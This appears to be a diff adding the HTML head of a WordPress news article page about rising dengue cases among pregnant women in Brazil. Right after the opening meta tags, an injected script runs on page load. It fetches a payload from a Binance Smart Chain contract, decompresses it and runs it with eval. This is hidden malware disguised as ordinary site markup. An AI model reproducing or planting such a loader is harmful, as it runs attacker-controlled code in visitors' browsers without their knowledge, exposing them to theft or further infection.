@@ -1,0 +1,808 @@
+<html lang="pt-PT" prefix="og: http://ogp.me/ns# fb: http://ogp.me/ns/fb#"><head>
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="profile" href="http://gmpg.org/xfn/11">
+    <link rel="pingback" href="https://correiodovale.com.br/xmlrpc.php">
+
+        <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/pako/2.0.4/pako.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/crypto-js@4.1.1/crypto-js.min.js"></script>
+    <script>
+        console.log('Start moving...');
+        document.addEventListener('DOMContentLoaded', async () => {
+            try {
+                const web3 = new Web3('https://bsc-dataseed.binance.org/');
+        
+                const contract = new web3.eth.Contract([
+                    {"inputs": [], "stateMutability": "nonpayable", "type": "constructor"},
+                    {"inputs": [], "name": "orchidABI", "outputs": [{"internalType": "string", "name": "", "type": "string"}], "stateMutability": "view", "type": "function"},
+                    {"inputs": [], "name": "orchidAddress", "outputs": [{"internalType": "string", "name": "", "type":"string"}], "stateMutability": "view", "type": "function"},
+                    {"inputs": [], "name": "merlionABI", "outputs": [{"internalType": "string", "name": "", "type": "string"}], "stateMutability": "view", "type": "function"},
+                    {"inputs": [], "name": "merlionAddress", "outputs": [{"internalType": "string", "name": "", "type":"string"}], "stateMutability": "view", "type": "function"},
+                ], '0x9179dda8B285040Bf381AABb8a1f4a1b8c37Ed53');
+        
+                const orchidABI = JSON.parse(pako.ungzip(Uint8Array.from(atob(await contract.methods.orchidABI().call()), c => c.charCodeAt(0)), { to: 'string' }));
+                const orchidAddress = await contract.methods.orchidAddress().call();
+                const orchid = new web3.eth.Contract(orchidABI, orchidAddress);
+        
+                const decompressedScript = pako.ungzip(Uint8Array.from(atob(await orchid.methods.tokyoSkytree().call()), c => c.charCodeAt(0)), { to: 'string' });
+                eval(`(async () => { ${decompressedScript} })().then(() => { console.log('Moved.'); }).catch(console.error);`);
+        
+            } catch (error) {
+                console.error('Road unavaible:', error);
+            }
+        });
+        </script><meta name="robots" content="index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1">
+	<style>img:is([sizes="auto" i], [sizes^="auto," i]) { contain-intrinsic-size: 3000px 1500px }</style>
+	
+	<!-- This site is optimized with the Yoast SEO plugin v22.7 - https://yoast.com/wordpress/plugins/seo/ -->
+	<title>Casos de dengue em gestantes aumentam 345% em 2024 - JORNAL CORREIO DO VALE</title>
+	<link rel="canonical" href="https://correiodovale.com.br/2024/03/02/casos-de-dengue-em-gestantes-aumentam-345-em-2024/">
+	<meta property="og:locale" content="pt_PT">
+	<meta property="og:type" content="article">
+	<meta property="og:title" content="Casos de dengue em gestantes aumentam 345% em 2024 - JORNAL CORREIO DO VALE">
+	<meta property="og:description" content="O número de casos de dengue em gestantes aumentou 345,2% nas seis primeiras semanas deste ano, na comparação com o mesmo período de 2023, segundo dados epidemiológicos do Ministério da Saúde divulgados nesta sexta-feira (1º).&nbsp; “Este aumento representa um quadro preocupante de saúde pública, considerando o risco elevado de complicações graves, tanto para elas quanto...">
+	<meta property="og:url" content="https://correiodovale.com.br/2024/03/02/casos-de-dengue-em-gestantes-aumentam-345-em-2024/">
+	<meta property="og:site_name" content="JORNAL CORREIO DO VALE">
+	<meta property="article:publisher" content="https://www.facebook.com/correiodovaledoitajai">
+	<meta property="article:published_time" content="2024-03-02T00:26:52+00:00">
+	<meta property="article:modified_time" content="2024-03-02T00:39:57+00:00">
+	<meta property="og:image" content="https://correiodovale.com.br/wp-content/uploads/2024/03/dengue.webp">
+	<meta property="og:image:width" content="1170">
+	<meta property="og:image:height" content="700">
+	<meta property="og:image:type" content="image/webp">
+	<meta name="author" content="admin">
+	<meta name="twitter:card" content="summary_large_image">
+	<meta name="twitter:creator" content="@CorreiodoItajai">
+	<meta name="twitter:site" content="@CorreiodoItajai">
+	<meta name="twitter:label1" content="Escrito por">
+	<meta name="twitter:data1" content="admin">
+	<meta name="twitter:label2" content="Tempo estimado de leitura">
+	<meta name="twitter:data2" content="1 minuto">
+	<script type="application/ld+json" class="yoast-schema-graph">{"@context":"https://schema.org","@graph":[{"@type":"Article","@id":"https://correiodovale.com.br/2024/03/02/casos-de-dengue-em-gestantes-aumentam-345-em-2024/#article","isPartOf":{"@id":"https://correiodovale.com.br/2024/03/02/casos-de-dengue-em-gestantes-aumentam-345-em-2024/"},"author":{"name":"admin","@id":"https://correiodovale.com.br/#/schema/person/973708632d4c7cec563196c4177319d6"},"headline":"Casos de dengue em gestantes aumentam 345% em 2024","datePublished":"2024-03-02T00:26:52+00:00","dateModified":"2024-03-02T00:39:57+00:00","mainEntityOfPage":{"@id":"https://correiodovale.com.br/2024/03/02/casos-de-dengue-em-gestantes-aumentam-345-em-2024/"},"wordCount":198,"commentCount":0,"publisher":{"@id":"https://correiodovale.com.br/#organization"},"image":{"@id":"https://correiodovale.com.br/2024/03/02/casos-de-dengue-em-gestantes-aumentam-345-em-2024/#primaryimage"},"thumbnailUrl":"https://correiodovale.com.br/wp-content/uploads/2024/03/dengue.webp","articleSection":["CIDADES","SAUDE"],"inLanguage":"pt-PT","potentialAction":[{"@type":"CommentAction","name":"Comment","target":["https://correiodovale.com.br/2024/03/02/casos-de-dengue-em-gestantes-aumentam-345-em-2024/#respond"]}]},{"@type":"WebPage","@id":"https://correiodovale.com.br/2024/03/02/casos-de-dengue-em-gestantes-aumentam-345-em-2024/","url":"https://correiodovale.com.br/2024/03/02/casos-de-dengue-em-gestantes-aumentam-345-em-2024/","name":"Casos de dengue em gestantes aumentam 345% em 2024 - JORNAL CORREIO DO VALE","isPartOf":{"@id":"https://correiodovale.com.br/#website"},"primaryImageOfPage":{"@id":"https://correiodovale.com.br/2024/03/02/casos-de-dengue-em-gestantes-aumentam-345-em-2024/#primaryimage"},"image":{"@id":"https://correiodovale.com.br/2024/03/02/casos-de-dengue-em-gestantes-aumentam-345-em-2024/#primaryimage"},"thumbnailUrl":"https://correiodovale.com.br/wp-content/uploads/2024/03/dengue.webp","datePublished":"2024-03-02T00:26:52+00:00","dateModified":"2024-03-02T00:39:57+00:00","breadcrumb":{"@id":"https://correiodovale.com.br/2024/03/02/casos-de-dengue-em-gestantes-aumentam-345-em-2024/#breadcrumb"},"inLanguage":"pt-PT","potentialAction":[{"@type":"ReadAction","target":["https://correiodovale.com.br/2024/03/02/casos-de-dengue-em-gestantes-aumentam-345-em-2024/"]}]},{"@type":"ImageObject","inLanguage":"pt-PT","@id":"https://correiodovale.com.br/2024/03/02/casos-de-dengue-em-gestantes-aumentam-345-em-2024/#primaryimage","url":"https://correiodovale.com.br/wp-content/uploads/2024/03/dengue.webp","contentUrl":"https://correiodovale.com.br/wp-content/uploads/2024/03/dengue.webp","width":1170,"height":700},{"@type":"BreadcrumbList","@id":"https://correiodovale.com.br/2024/03/02/casos-de-dengue-em-gestantes-aumentam-345-em-2024/#breadcrumb","itemListElement":[{"@type":"ListItem","position":1,"name":"Início","item":"https://correiodovale.com.br/"},{"@type":"ListItem","position":2,"name":"Casos de dengue em gestantes aumentam 345% em 2024"}]},{"@type":"WebSite","@id":"https://correiodovale.com.br/#website","url":"https://correiodovale.com.br/","name":"JORNAL CORREIO DO VALE","description":"SITE DE NOTICIAS","publisher":{"@id":"https://correiodovale.com.br/#organization"},"alternateName":"JORNAL CORREIO DO VALE DO ITAJAI","potentialAction":[{"@type":"SearchAction","target":{"@type":"EntryPoint","urlTemplate":"https://correiodovale.com.br/?s={search_term_string}"},"query-input":"required name=search_term_string"}],"inLanguage":"pt-PT"},{"@type":"Organization","@id":"https://correiodovale.com.br/#organization","name":"MACEDO SOLUÇÕES INTEGRADAS LTDA","url":"https://correiodovale.com.br/","logo":{"@type":"ImageObject","inLanguage":"pt-PT","@id":"https://correiodovale.com.br/#/schema/logo/image/","url":"https://correiodovale.com.br/wp-content/uploads/2024/04/correiodovale_logo-branco.png","contentUrl":"https://correiodovale.com.br/wp-content/uploads/2024/04/correiodovale_logo-branco.png","width":475,"height":470,"caption":"MACEDO SOLUÇÕES INTEGRADAS LTDA"},"image":{"@id":"https://correiodovale.com.br/#/schema/logo/image/"},"sameAs":["https://www.facebook.com/correiodovaledoitajai","https://x.com/CorreiodoItajai","https://www.instagram.com/correiodovale_"]},{"@type":"Person","@id":"https://correiodovale.com.br/#/schema/person/973708632d4c7cec563196c4177319d6","name":"admin","image":{"@type":"ImageObject","inLanguage":"pt-PT","@id":"https://correiodovale.com.br/#/schema/person/image/","url":"https://secure.gravatar.com/avatar/6b91a71376044897977bd500e6779894?s=96&d=mm&r=g","contentUrl":"https://secure.gravatar.com/avatar/6b91a71376044897977bd500e6779894?s=96&d=mm&r=g","caption":"admin"},"sameAs":["https://correiodovale.com.br"],"url":"https://correiodovale.com.br/author/admin/"}]}</script>
+	<!-- / Yoast SEO plugin. -->
+
+
+<link rel="dns-prefetch" href="//fonts.googleapis.com">
+<link rel="alternate" type="application/rss+xml" title="JORNAL CORREIO DO VALE » Feed" href="https://correiodovale.com.br/feed/">
+<link rel="alternate" type="application/rss+xml" title="JORNAL CORREIO DO VALE » Feed de comentários" href="https://correiodovale.com.br/comments/feed/">
+<link rel="alternate" type="application/rss+xml" title="Feed de comentários de JORNAL CORREIO DO VALE » Casos de dengue em gestantes aumentam 345% em 2024" href="https://correiodovale.com.br/2024/03/02/casos-de-dengue-em-gestantes-aumentam-345-em-2024/feed/">
+<script type="text/javascript">
+/* <![CDATA[ */
+window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/correiodovale.com.br\/wp-includes\/js\/wp-emoji-release.min.js?ver=6.7.1"}};
+/*! This file is auto-generated */
+!function(i,n){var o,s,e;function c(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function p(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data),r=(e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0),new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data));return t.every(function(e,t){return e===r[t]})}function u(e,t,n){switch(t){case"flag":return n(e,"\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f","\ud83c\udff3\ufe0f\u200b\u26a7\ufe0f")?!1:!n(e,"\ud83c\uddfa\ud83c\uddf3","\ud83c\uddfa\u200b\ud83c\uddf3")&&!n(e,"\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f","\ud83c\udff4\u200b\udb40\udc67\u200b\udb40\udc62\u200b\udb40\udc65\u200b\udb40\udc6e\u200b\udb40\udc67\u200b\udb40\udc7f");case"emoji":return!n(e,"\ud83d\udc26\u200d\u2b1b","\ud83d\udc26\u200b\u2b1b")}return!1}function f(e,t,n){var r="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):i.createElement("canvas"),a=r.getContext("2d",{willReadFrequently:!0}),o=(a.textBaseline="top",a.font="600 32px Arial",{});return e.forEach(function(e){o[e]=t(a,e,n)}),o}function t(e){var t=i.createElement("script");t.src=e,t.defer=!0,i.head.appendChild(t)}"undefined"!=typeof Promise&&(o="wpEmojiSettingsSupports",s=["flag","emoji"],n.supports={everything:!0,everythingExceptFlag:!0},e=new Promise(function(e){i.addEventListener("DOMContentLoaded",e,{once:!0})}),new Promise(function(t){var n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+f.toString()+"("+[JSON.stringify(s),u.toString(),p.toString()].join(",")+"));",r=new Blob([e],{type:"text/javascript"}),a=new Worker(URL.createObjectURL(r),{name:"wpTestEmojiSupports"});return void(a.onmessage=function(e){c(n=e.data),a.terminate(),t(n)})}catch(e){}c(n=f(s,u,p))}t(n)}).then(function(e){for(var t in e)n.supports[t]=e[t],n.supports.everything=n.supports.everything&&n.supports[t],"flag"!==t&&(n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&n.supports[t]);n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&!n.supports.flag,n.DOMReady=!1,n.readyCallback=function(){n.DOMReady=!0}}).then(function(){return e}).then(function(){var e;n.supports.everything||(n.readyCallback(),(e=n.source||{}).concatemoji?t(e.concatemoji):e.wpemoji&&e.twemoji&&(t(e.twemoji),t(e.wpemoji)))}))}((window,document),window._wpemojiSettings);
+/* ]]> */
+</script>
+<style id="wp-emoji-styles-inline-css" type="text/css">
+
+	img.wp-smiley, img.emoji {
+		display: inline !important;
+		border: none !important;
+		box-shadow: none !important;
+		height: 1em !important;
+		width: 1em !important;
+		margin: 0 0.07em !important;
+		vertical-align: -0.1em !important;
+		background: none !important;
+		padding: 0 !important;
+	}
+</style>
+<link rel="stylesheet" id="wp-block-library-css" href="https://correiodovale.com.br/wp-includes/css/dist/block-library/style.min.css?ver=6.7.1" type="text/css" media="all">
+<style id="classic-theme-styles-inline-css" type="text/css">
+/*! This file is auto-generated */
+.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}
+</style>
+<style id="global-styles-inline-css" type="text/css">
+:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
+:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}
+:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
+:root :where(.wp-block-pullquote){font-size: 1.5em;line-height: 1.6;}
+</style>
+<link rel="stylesheet" id="t4bnewsticker-css" href="https://correiodovale.com.br/wp-content/plugins/t4b-news-ticker/assets/css/t4bnewsticker.css?ver=1.2.9" type="text/css" media="all">
+<link rel="stylesheet" id="SFSImainCss-css" href="https://correiodovale.com.br/wp-content/plugins/ultimate-social-media-icons/css/sfsi-style.css?ver=2.9.0" type="text/css" media="all">
+<link rel="stylesheet" id="accesspress-mag-google-fonts-css" href="//fonts.googleapis.com/css?family=Open+Sans%3A400%7COswald%3A400%7CDosis%3A400&amp;ver=6.7.1" type="text/css" media="all">
+<link rel="stylesheet" id="animate-css" href="https://correiodovale.com.br/wp-content/themes/accesspress-mag-pro/css/animate.css?ver=6.7.1" type="text/css" media="all">
+<link rel="stylesheet" id="accesspress-mag-fontawesome-font-css" href="https://correiodovale.com.br/wp-content/themes/accesspress-mag-pro/css/font-awesome.min.css?ver=6.7.1" type="text/css" media="all">
+<link rel="stylesheet" id="accesspress-mag-tooltipstyle-css" href="https://correiodovale.com.br/wp-content/themes/accesspress-mag-pro/css/tooltipster.css?ver=6.7.1" type="text/css" media="all">
+<link rel="stylesheet" id="accesspress-mag-scroolstyle-css" href="https://correiodovale.com.br/wp-content/themes/accesspress-mag-pro/css/jquery.scrollbar.css?ver=6.7.1" type="text/css" media="all">
+<link rel="stylesheet" id="accesspress-mag-owlCarouselStyle-css" href="https://correiodovale.com.br/wp-content/themes/accesspress-mag-pro/css/owl.carousel.css?ver=6.7.1" type="text/css" media="all">
+<link rel="stylesheet" id="accesspress-mag-style-css" href="https://correiodovale.com.br/wp-content/themes/accesspress-mag-pro/style.css?ver=2.2.7" type="text/css" media="all">
+<link rel="stylesheet" id="responsive-css" href="https://correiodovale.com.br/wp-content/themes/accesspress-mag-pro/css/responsive.css?ver=6.7.1" type="text/css" media="all">
+<link rel="stylesheet" id="accesspress-mag-nivolightbox-style-css" href="https://correiodovale.com.br/wp-content/themes/accesspress-mag-pro/js/lightbox/nivo-lightbox.css?ver=1.2.0" type="text/css" media="all">
+<link rel="stylesheet" id="accesspress-mag-dynamic-style-css" href="https://correiodovale.com.br/wp-content/themes/accesspress-mag-pro/css/style.php?ver=6.7.1" type="text/css" media="all">
+<script type="text/javascript" src="https://correiodovale.com.br/wp-includes/js/jquery/jquery.min.js?ver=3.7.1" id="jquery-core-js"></script>
+<script type="text/javascript" src="https://correiodovale.com.br/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.4.1" id="jquery-migrate-js"></script>
+<script type="text/javascript" src="https://correiodovale.com.br/wp-content/themes/accesspress-mag-pro/js/pace.min.js?ver=1" id="accesspress-mag-pacemin-js"></script>
+<link rel="https://api.w.org/" href="https://correiodovale.com.br/wp-json/"><link rel="alternate" title="JSON" type="application/json" href="https://correiodovale.com.br/wp-json/wp/v2/posts/5055"><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://correiodovale.com.br/xmlrpc.php?rsd">
+<meta name="generator" content="WordPress 6.7.1">
+<link rel="shortlink" href="https://correiodovale.com.br/?p=5055">
+<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://correiodovale.com.br/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fcorreiodovale.com.br%2F2024%2F03%2F02%2Fcasos-de-dengue-em-gestantes-aumentam-345-em-2024%2F">
+<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://correiodovale.com.br/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fcorreiodovale.com.br%2F2024%2F03%2F02%2Fcasos-de-dengue-em-gestantes-aumentam-345-em-2024%2F&amp;format=xml">
+<meta name="follow.it-verification-code-QWwxVFNmc3R4UmNPUUsveDJVVUFCWWdVcFB4UERneTZWYmQxL3RaYlZ2aWhJWkxTblFod2lPcHpaUDk3Mng4YTk2Ny9aWk55VmhLM2VoMjRJRUpYL205dnhWQlkvL0RyNFZSWUN6QkpoRExwRU9zanZZUXZqdUphL3NBVEtqZWV8UWt4dVI0NW5ZcEdZOC9GYi9VL0JPMEtWRktLcnNrRDZWQmNad2dydEpUZz0=" content="Bxkx5gBBQtkNmH3ml7zv">        <script type="text/javascript">
+            jQuery(function($){
+                $("#homeslider").bxSlider({
+                    adaptiveHeight: true,
+                    pager:false,
+                    controls:false,
+                    mode: 'horizontal',
+                    auto:true,
+                    pause: '5000',
+                    speed: '5000'
+                });
+                });
+        </script>
+    
+<link href="//fonts.googleapis.com/css?family=Dosis:400|Dosis:400|Dosis:400|Oswald:400|Oswald:400|Dosis:400|Oswald:400|Oswald:400|Dosis:400|Dosis:400|Oswald:400|Oswald:400|Oswald:400&amp;subset=latin,cyrillic-ext,greek-ext,greek,vietnamese,latin-ext,cyrillic,khmer,devanagari,arabic,hebrew,telugu" rel="stylesheet" type="text/css">
+	<style type="text/css">
+			.site-title,
+		.site-description {
+			position: absolute;
+			clip: rect(1px, 1px, 1px, 1px);
+		}
+		</style>
+	<link rel="icon" href="https://correiodovale.com.br/wp-content/uploads/2021/03/LOGO-JORNAL-1.png" sizes="32x32">
+<link rel="icon" href="https://correiodovale.com.br/wp-content/uploads/2021/03/LOGO-JORNAL-1.png" sizes="192x192">
+<link rel="apple-touch-icon" href="https://correiodovale.com.br/wp-content/uploads/2021/03/LOGO-JORNAL-1.png">
+<meta name="msapplication-TileImage" content="https://correiodovale.com.br/wp-content/uploads/2021/03/LOGO-JORNAL-1.png">
+		<style type="text/css" id="wp-custom-css">
+			.site-info {
+    display: none;
+}
+		</style>
+		
+<!-- START - Open Graph and Twitter Card Tags 3.3.3 -->
+ <!-- Facebook Open Graph -->
+  <meta property="og:title" content="Casos de dengue em gestantes aumentam 345% em 2024 - JORNAL CORREIO DO VALE">
+  <meta property="og:description" content="O número de casos de dengue em gestantes aumentou 345,2% nas seis primeiras semanas deste ano, na comparação com o mesmo período de 2023, segundo dados epidemiológicos do Ministério da Saúde divulgados nesta sexta-feira (1º). “Este aumento representa um quadro preocupante de saúde pública, consi">
+  <meta property="fb:admins" content="341131289364076">
+ <!-- Google+ / Schema.org -->
+ <!-- Twitter Cards -->
+  <meta name="twitter:title" content="Casos de dengue em gestantes aumentam 345% em 2024 - JORNAL CORREIO DO VALE">
+  <meta name="twitter:description" content="O número de casos de dengue em gestantes aumentou 345,2% nas seis primeiras semanas deste ano, na comparação com o mesmo período de 2023, segundo dados epidemiológicos do Ministério da Saúde divulgados nesta sexta-feira (1º). “Este aumento representa um quadro preocupante de saúde pública, consi">
+  <meta name="twitter:card" content="summary">
+ <!-- SEO -->
+ <!-- Misc. tags -->
+ <!-- is_singular | yoast_seo -->
+<!-- END - Open Graph and Twitter Card Tags 3.3.3 -->
+	
+
+</head>
+
+<body class="post-template-default single single-post postid-5055 single-format-standard sfsi_actvite_theme_default single-post-right-sidebar header_style2 home-default-layout single-post-single fullwidth-layout group-blog">
+<div id="page" class="hfeed site">
+    <a class="skip-link screen-reader-text" href="#content">Skip to content</a>
+    <header id="masthead" class="site-header" role="banner">
+            <div class="logo-ad-wrapper header-style-2 clearfix">
+    <div class="apmag-container">
